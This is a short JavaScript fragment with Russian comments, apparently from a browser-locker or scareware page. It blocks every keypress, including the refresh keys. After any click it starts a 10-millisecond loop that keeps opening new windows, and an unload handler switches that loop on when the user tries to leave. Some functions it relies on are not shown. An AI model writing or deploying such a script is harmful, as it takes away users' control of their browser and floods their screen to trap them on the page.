// Инициализация
document.addEventListener("DOMContentLoaded", init);

// блокировка нажатий клавиш (F5, ctrl+r)
window.addEventListener("keydown", (e) => {
  e.preventDefault();
});

// click frezzer
document.addEventListener("click", () => {
  setInterval(() => {
    if (!tik || stop) return;
    openNewWindow();
  }, 10);
});

// отслеживание закрытия окна
window.onbeforeunload = function (e) {
  tik = true;
};
